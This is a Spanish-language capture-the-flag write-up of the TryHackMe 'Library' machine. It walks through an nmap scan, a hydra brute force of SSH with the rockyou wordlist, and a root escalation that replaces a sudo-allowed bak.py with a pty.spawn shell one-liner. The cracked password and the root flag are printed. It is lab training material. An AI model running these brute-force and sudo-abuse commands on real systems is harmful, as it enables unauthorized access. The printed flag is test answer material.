# Writeup Library - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.113.172.103` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración Web](#enumeración-web)
3. [Acceso Inicial (Fuerza Bruta SSH)](#acceso-inicial-fuerza-bruta-ssh)
4. [Escalada de Privilegios (Python Library Hijacking)](#escalada-de-privilegios-python-library-hijacking)
5. [Flags](#flags)

---

Lo primero que vamos a hacer es un escaneo de puertos con Nmap para saber con lo que tenemos para empezar a tener acceso y saber puntos de entrada.

```bash
sudo nmap -sS -p- -Pn -sC -sV 10.113.172.103 -oN scan_library.txt


```

### Resultados del Escaneo

```bash
# Nmap 7.95 scan initiated Sun Mar 22 11:53:24 2026 as: nmap -sS -p- -Pn -sC -sV -oN scan_library.txt 10.113.172.103
Nmap scan report for 10.113.172.103
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 22 12:06:26 2026 -- 1 IP address (1 host up) scanned in 782.75 seconds
```
Hemos encontrado dos posibles entradas a nuestra máquina, por SSH y por HTTP, y además, nos detectó un "robots.txt", que puede contener información util de rutas ocultas o de como entrar.

## Acceso al sitio web y a robots.txt
Al acceder a la dirección IP proporcionada, nos salta una especie de blog de boot2root machine de TryHackMe creado por el usuario "meliodas".

![Autor meliodas en el blog](/imgLibrary/image.png)

Al acceder al archivo robots.txt, podemos ver que el User-Agent hace referencia a un diccionario de contraseñas muy conocido, llamado rockyou, por lo que se puede intuir que el usuario para acceder por SSH es "meliodas", y la contraseña de acceso está en el diccionario.

![robots.txt](/imgLibrary/image4.png)

---

## Acceso Inicial (Ataque de Fuerza Bruta SSH)

Ya con el usuario meliodas y el diccionario listo para atacar, lo que vamos a hacer ahora es utilizar hydra para lanzar un ataque de fuerza bruta con diccionario para obtener acceso a la máquina por SSH.

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.113.172.103
```

![Ataque de fuerza bruta con hydra completado](/imgLibrary/image5.png)

¡Bum! Tenemos la contraseña de acceso a la máquina: iloveyou1, ya podremos acceder sin problema como usuario a la máquina.

Nos conectamos al sistema vía SSH:

```bash
ssh meliodas@10.113.172.103

```

Una vez dentro, localizamos la flag de usuario:

```bash
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat user.txt

```
![flag de usuario](/imgLibrary/image2.png)

*Flag de usuario encontrada en el directorio home de meliodas.*

---

## Escalada de Privilegios

Ahora que tenemos acceso como usuario la máquina, debemos buscar la forma de como podemos escalar de privilegios para ser usuarios root. Para ello, tengo un as bajo la manga, el comando `sudo -l`. Lo que hace este comando, es básicamente, listar lo que podemos ejecutar como usuario privilegiado sin necesidad de la contraseña de administrador.

```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

```

Vale, al parecer podemos ejecutar con privilegios de administrador un archivo  de python llamado bak.py que se encuentra en nuestro directorio personal. Revisemos el contenido de este script inofensivo que realiza aparentemente un backup del sitio web:

```bash
meliodas@ubuntu:~$ cat bak.py

```

```python
#!/usr/bin/env python
import os
import zipfile

def make_archive(source, destination):
    with zipfile.ZipFile(destination, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(source)

make_archive('/var/www/html', '/var/backups/website.zip')
```

Para poder abusar del privilegio de bak.py, lo que voy a hacer es borrar el archivo, y crear uno nuevo del mismo nombre, pero con un contenido totalmente diferente para poder escalar privilegios.

```bash
meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? y
meliodas@ubuntu:~$ touch bak.py
meliodas@ubuntu:~$ echo 'import pty:pty.spawn("/bin/bash")' > bak.py
meliodas@ubuntu:~$ sudo python bak.py
[sudo] password for meliodas: 
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
  File "/home/meliodas/bak.py", line 1
    import pty:pty.spawn("/bin/bash")
              ^
SyntaxError: invalid syntax
meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
```

¡Bum! Tenemos acceso root con nuestro pequeño script en Python para poder entrar. Lo que hace básicamente es poder aprovechar el privilegio de admin para usar el binario de python y obtener una shell como root.

```bash
root@ubuntu:~# cd /root
root@ubuntu:/root# cat root.txt
e8c8c6c256c35515d1d344ee0488c617

```

![Shell de root](/imgLibrary/image3.png)
*Shell de root obtenida tras la escalada de privilegios mediante sustitución de bak.py.*

---

